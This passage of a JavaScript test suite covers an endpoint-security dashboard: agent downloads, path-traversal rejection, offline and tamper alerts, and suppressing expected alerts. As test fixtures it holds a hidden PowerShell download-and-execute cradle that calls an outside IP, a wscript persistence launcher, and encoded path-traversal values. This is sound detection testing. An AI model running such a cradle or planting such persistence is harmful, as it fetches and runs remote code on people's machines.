    assert.match((await none.json()).error, /no agent build/);
    assert.deepEqual((await call('/api/guard/endpoints', { cookie: owner.cookie })).json.downloads, {
      windows: { available: false },
      linux: { available: false },
    });

    const linux = Buffer.from('\x7fELF pretend linux agent');
    const windows = Buffer.from('MZ pretend windows agent');
    writeFileSync(join(dir, 'securovix-guard-linux-x86_64'), linux);
    writeFileSync(join(dir, 'securovix-guard-windows-x86_64.exe'), windows);
    const sha = (bytes) => createHash('sha256').update(bytes).digest('hex');

    // A server with no browser: plain GET, no cookie, no token, through the enforcing Defender.
    const got = await fetch(`${base}/api/endpoint-agent/v1/download/linux`);
    assert.equal(got.status, 200);
    assert.deepEqual(Buffer.from(await got.arrayBuffer()), linux);
    assert.equal(got.headers.get('x-checksum-sha256'), sha(linux));
    assert.match(got.headers.get('content-disposition'), /filename="securovix-guard"/);
    const exe = await fetch(`${base}/api/endpoint-agent/v1/download/windows`);
    assert.match(exe.headers.get('content-disposition'), /filename="securovix-guard\.exe"/);
    assert.deepEqual(Buffer.from(await exe.arrayBuffer()), windows);

    // The dashboard shows the same checksum, so the one-line command can verify the file.
    const listed = (await call('/api/guard/endpoints', { cookie: owner.cookie })).json.downloads;
    assert.deepEqual(listed.linux, { available: true, sha256: sha(linux), size: linux.length });
    assert.deepEqual(listed.windows, { available: true, sha256: sha(windows), size: windows.length });

    // A new build replaces the old checksum (no stale cache).
    const rebuilt = Buffer.from('\x7fELF a newer, longer pretend linux agent');
    writeFileSync(join(dir, 'securovix-guard-linux-x86_64'), rebuilt);
    assert.equal(
      (await fetch(`${base}/api/endpoint-agent/v1/download/linux`)).headers.get('x-checksum-sha256'),
      sha(rebuilt),
    );

    // Only the two known files are ever served.
    for (const platform of ['macos', '..%2F..%2Fpackage.json', 'linux%2F..%2Fserver.mjs', '__proto__', 'constructor'])
      assert.equal((await fetch(`${base}/api/endpoint-agent/v1/download/${platform}`)).status, 404, platform);

    // The signed-in link serves the same file; signed out it asks for a sign-in.
    assert.equal((await fetch(`${base}/api/guard/endpoints/download/linux`)).status, 401);
    const signedIn = await fetch(`${base}/api/guard/endpoints/download/linux`, {
      headers: { cookie: owner.cookie },
    });
    assert.equal(signedIn.headers.get('x-checksum-sha256'), sha(rebuilt));
  } finally {
    Reflect.deleteProperty(process.env, 'SHANNON_GUARD_AGENT_DIR');
    rmSync(dir, { recursive: true, force: true });
  }
});

test('extra folders to watch are saved for servers, trimmed and capped', async () => {
  const saved = await call('/api/guard/endpoints/policy', {
    method: 'POST',
    cookie: owner.cookie,
    body: {
      extraWatch: ['/srv/data', '  /var/www  ', 'D:\\Shared', '', ...Array.from({ length: 40 }, (_, i) => `/x/${i}`)],
    },
  });
  assert.equal(saved.status, 200, JSON.stringify(saved.json));
  assert.deepEqual(saved.json.policy.extraWatch.slice(0, 3), ['/srv/data', '/var/www', 'D:\\Shared']);
  assert.equal(saved.json.policy.extraWatch.length, 20);
  const before = saved.json.policy.version;
  const cleared = await call('/api/guard/endpoints/policy', {
    method: 'POST',
    cookie: owner.cookie,
    body: { extraWatch: [] },
  });
  assert.deepEqual(cleared.json.policy.extraWatch, []);
  assert.equal(cleared.json.policy.version, before + 1, 'agents pick the change up at their next check-in');
  assert.equal(
    (
      await call('/api/guard/endpoints/policy', {
        method: 'POST',
        cookie: viewer.cookie,
        headers: { 'x-shannon-org': owner.orgId },
        body: { extraWatch: ['/etc'] },
      })
    ).status,
    403,
  );
});

// ---------- the store refuses what Supabase would refuse ----------

test('record stores sort by a column the table has and reject unknown fields before Supabase does', async () => {
  const edb = await import('./packages/dashboard/enterprise-db.mjs');
  // Agents have enrolledAt, not createdAt. Sorting them by the old default failed on Supabase
  // ("column shannon_guard_agents.undefined does not exist") and broke every agent install.
  const agents = await edb.guardAgents.list({ orgId: owner.orgId }, { limit: 500 });
  assert.ok(agents.length >= 1);
  for (const store of [edb.guardState, edb.guardHashes, edb.guardEndpoint, edb.guardAgents])
    assert.ok(Array.isArray(await store.list({}, { limit: 5 })), 'tables without createdAt still list');
  await assert.rejects(edb.guardAgents.list({}, { orderBy: 'createdAt' }), /not a field of this record type \(sort\)/);
  await assert.rejects(edb.guardAgents.list({ hostName: 'x' }), /not a field of this record type \(filter\)/);
  await assert.rejects(
    edb.guardAgents.save({ ...agents[0], notAColumn: 1 }),
    /no column for notAColumn/,
    'under test, a value Supabase would silently drop is an error',
  );
  const saved = await edb.guardAgents.save({ ...agents[0], notAColumn: undefined });
  assert.equal(Object.hasOwn(saved, 'notAColumn'), false, 'only mapped fields are stored');
});

// ---------- accuracy: offline machines, a stopped agent, "this is expected" ----------

const quiet = await signup('endpoint-quiet@example.test');
let quietToken;
let quietId;
const events = (token, list) =>
  call('/api/endpoint-agent/v1/events', { method: 'POST', token, body: { events: list } });
const incidentsOf = async (cookie) => (await call('/api/guard/incidents', { cookie })).json.incidents;

test('a PC that goes quiet is offline, not an incident; the owner decides per machine', async () => {
  const made = await call('/api/guard/endpoints/enroll-token', { method: 'POST', cookie: quiet.cookie });
  const enrolled = await call('/api/endpoint-agent/v1/enroll', {
    method: 'POST',
    body: {
      token: made.json.token,
      hostname: 'HOME-PC',
      os: 'windows',
      osVersion: 'Windows 11 Home',
      version: '0.1.2',
      machineId: 'q-1',
    },
  });
  quietToken = enrolled.json.token;
  quietId = enrolled.json.agentId;
  const edb = await import('./packages/dashboard/enterprise-db.mjs');
  const backdate = async (minutes) => {
    const agent = await edb.guardAgents.get(quietId);
    await edb.guardAgents.save({ ...agent, lastSeenAt: Date.now() - minutes * 60_000, tamperAlertedAt: null });
  };
  await backdate(45);
  await runGuardCycles();
  assert.deepEqual(await incidentsOf(quiet.cookie), [], 'a home PC switched off overnight raises nothing');
  let view = (await call('/api/guard/endpoints', { cookie: quiet.cookie })).json.agents[0];
  assert.equal(view.online, false);
  assert.equal(view.expectOnline, false);

  assert.equal(
    (
      await call(`/api/guard/endpoints/${quietId}/expect-online`, {
        method: 'POST',
        cookie: quiet.cookie,
        body: { value: 'yes' },
      })
    ).status,
    400,
  );
  assert.equal(
    (
      await call(`/api/guard/endpoints/${agentId}/expect-online`, {
        method: 'POST',
        cookie: quiet.cookie,
        body: { value: true },
      })
    ).status,
    404,
    "another organization's machine",
  );
  const set = await call(`/api/guard/endpoints/${quietId}/expect-online`, {
    method: 'POST',
    cookie: quiet.cookie,
    body: { value: true },
  });
  assert.equal(set.json.expectOnline, true);
  await runGuardCycles();
  const offline = (await incidentsOf(quiet.cookie)).find((i) => i.title.startsWith('Machine stopped reporting'));
  assert.ok(offline, 'now that it is marked as always on, silence is reported');
  assert.equal(offline.severity, 'medium');
  const detail = await call(`/api/guard/incidents/${offline.id}`, { cookie: quiet.cookie });
  assert.match(detail.json.incident.summary, /Nothing here shows an attack/);
  assert.doesNotMatch(detail.json.incident.summary, /MITRE/);
  await call(`/api/guard/incidents/${offline.id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });

  // Said "shutting down" before going quiet: not reported, and the dashboard says why it is off.
  await call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: quietToken, body: { version: '0.1.2' } });
  await events(quietToken, [{ id: 'off1', type: 'agent.offline', at: Date.now(), detail: { reason: 'shutdown' } }]);
  await backdate(30);
  const agent = await edb.guardAgents.get(quietId);
  const record = await edb.guardEndpoint.get(quiet.orgId);
  record.hosts[quietId].offline.at = agent.lastSeenAt;
  await edb.guardEndpoint.save(record);
  await runGuardCycles();
  assert.equal((await incidentsOf(quiet.cookie)).filter((i) => i.status === 'open').length, 0);
  view = (await call('/api/guard/endpoints', { cookie: quiet.cookie })).json.agents[0];
  assert.equal(view.offlineReason, 'shutdown');
  await call(`/api/guard/endpoints/${quietId}/expect-online`, {
    method: 'POST',
    cookie: quiet.cookie,
    body: { value: false },
  });
});

test('a stopped Guard service: silent for an update, reported if it stays down or returns unchanged', async () => {
  const open = async () => (await incidentsOf(quiet.cookie)).filter((i) => i.status === 'open');
  const stop = (id, agoMs) => ({
    id,
    type: 'agent.tamper',
    at: Date.now() - agoMs,
    detail: { reason: 'the Guard service was stopped on this machine' },
  });
  const checkin = (body) => call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: quietToken, body });

  // 1. Stopped, then back with a newer version: an update. Nothing is raised.
  await checkin({ version: '0.1.2' });
  assert.equal((await events(quietToken, [stop('s1', 20_000)])).json.alerts, 0);
  await checkin({ version: '0.1.2', startedAt: Date.now() - 60_000 });
  await runGuardCycles();
  assert.equal((await open()).length, 0, 'the stopping process still talking is not "back"');
  await checkin({ version: '0.1.3', startedAt: Date.now() - 5000 });
  await runGuardCycles();
  assert.equal((await open()).length, 0, 'came back as a new version');

  // 2. Stopped and started again, same version: someone switched Guard off for a while.
  await events(quietToken, [stop('s2', 40_000)]);
  await checkin({ version: '0.1.3', startedAt: Date.now() - 2000 });
  let incidents = await open();
  assert.equal(incidents.length, 1);
  assert.equal(incidents[0].severity, 'medium');
  let detail = await call(`/api/guard/incidents/${incidents[0].id}`, { cookie: quiet.cookie });
  assert.match(detail.json.incident.summary, /stopped for \d+ seconds and then started again/);
  await call(`/api/guard/incidents/${incidents[0].id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });

  // 3. Stopped and still down after the grace period.
  await events(quietToken, [stop('s3', 5 * 60_000)]);
  await runGuardCycles();
  incidents = await open();
  assert.equal(incidents.length, 1);
  assert.equal(incidents[0].severity, 'high');
  detail = await call(`/api/guard/incidents/${incidents[0].id}`, { cookie: quiet.cookie });
  assert.match(detail.json.incident.summary, /has not started again/);
  await runGuardCycles();
  await checkin({ version: '0.1.3', startedAt: Date.now() - 1000 });
  assert.equal((await open()).length, 1, 'reported once, not again when it returns');
  await call(`/api/guard/incidents/${incidents[0].id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });

  // 4. Stopped, then installed again (a new credential): the reinstall explains it.
  await events(quietToken, [stop('s4', 30_000)]);
  const made = await call('/api/guard/endpoints/enroll-token', { method: 'POST', cookie: quiet.cookie });
  const again = await call('/api/endpoint-agent/v1/enroll', {
    method: 'POST',
    body: {
      token: made.json.token,
      hostname: 'HOME-PC',
      os: 'windows',
      osVersion: 'Windows 11 Home',
      version: '0.1.3',
      machineId: 'q-1',
    },
  });
  assert.equal(again.json.agentId, quietId);
  quietToken = again.json.token;
  await checkin({ version: '0.1.3', startedAt: Date.now() });
  await runGuardCycles();
  assert.equal((await open()).length, 0);
});

test('"This is expected" silences one exact file everywhere, can be undone, and never hides a critical alert', async () => {
  const launcher = (id) => ({
    id,
    type: 'persistence.created',
    at: Date.now() - 1000,
    persistence: {
      kind: 'scheduled-task',
      name: '\\LocalAgent',
      command: 'wscript.exe //B //Nologo "C:\\Users\\amy\\AppData\\Roaming\\LocalAgent\\bin\\launcher.vbs"',
    },
  });
  const cradle = (id) => ({
    id,
    type: 'process.start',
    at: Date.now() - 900,
    process: { pid: 77, name: 'powershell.exe', cmdline: 'powershell -w hidden -c "iex(irm http://203.0.113.5/a)"' },
  });
  assert.equal((await events(quietToken, [launcher('x1'), cradle('x2')])).json.alerts, 2);
  const incident = (await incidentsOf(quiet.cookie)).find((i) => i.status === 'open');
  const detail = await call(`/api/guard/incidents/${incident.id}`, { cookie: quiet.cookie });
  assert.equal(detail.json.canManage, true);
  const autostart = detail.json.incident.alerts.find((a) => a.rule === 'persistence-created');
  const critical = detail.json.incident.alerts.find((a) => a.rule === 'encoded-powershell');
  assert.match(autostart.trust.label, /launcher\.vbs$/i);
  assert.equal(critical.severity, 'critical');
  assert.equal(critical.trust, undefined);

  const mark = (cookie, alertId, incidentId = incident.id) =>
    call('/api/guard/endpoints/expected', { method: 'POST', cookie, body: { incidentId, alertId } });
  assert.equal((await mark(owner.cookie, autostart.id)).status, 404, "another organization's incident");
  assert.equal((await mark(quiet.cookie, critical.id)).status, 400, 'a critical alert cannot be marked as expected');
  const marked = await mark(quiet.cookie, autostart.id);
  assert.equal(marked.status, 200, JSON.stringify(marked.json));
  assert.deepEqual({ removed: marked.json.removed, closed: marked.json.closed }, { removed: 1, closed: 0 });
  const after = await call(`/api/guard/incidents/${incident.id}`, { cookie: quiet.cookie });
  assert.deepEqual(
    after.json.incident.alerts.map((a) => a.rule),
    ['encoded-powershell'],
    'the attack is still there',
  );
  assert.equal(after.json.incident.severity, 'critical');

  assert.equal((await events(quietToken, [launcher('x3')])).json.alerts, 0, 'no longer reported');
  const overview = await call('/api/guard/endpoints', { cookie: quiet.cookie });
  assert.equal(overview.json.expected.length, 1);
  assert.equal(overview.json.expected[0].by, 'endpoint-quiet@example.test');
  assert.equal((await call('/api/guard/endpoints', { cookie: owner.cookie })).json.expected.length, 0);

  const fp = overview.json.expected[0].fp;
  assert.equal(
    (await call(`/api/guard/endpoints/expected/${encodeURIComponent(fp)}`, { method: 'DELETE', cookie: quiet.cookie }))
      .json.removed,
    true,
  );
  assert.equal(
    (await events(quietToken, [launcher('x4')])).json.alerts,
    1,
    'reported again once it is removed from the list',
  );

  // An incident made only of expected alerts is closed, with a note saying why.
  await call(`/api/guard/incidents/${incident.id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });
  await events(quietToken, [
    {
      ...launcher('x5'),
      persistence: { kind: 'run-key', name: 'Notes', command: 'C:\\Users\\amy\\AppData\\Local\\Notes\\notes.exe' },
    },
  ]);
  const lone = (await incidentsOf(quiet.cookie)).find((i) => i.status === 'open');
  const loneAlert = (await call(`/api/guard/incidents/${lone.id}`, { cookie: quiet.cookie })).json.incident.alerts[0];
  const closed = await mark(quiet.cookie, loneAlert.id, lone.id);
  assert.deepEqual({ removed: closed.json.removed, closed: closed.json.closed }, { removed: 1, closed: 1 });
  const done = (await call(`/api/guard/incidents/${lone.id}`, { cookie: quiet.cookie })).json.incident;
  assert.equal(done.status, 'closed');
  assert.match(done.closeNote, /marked as expected/);
});
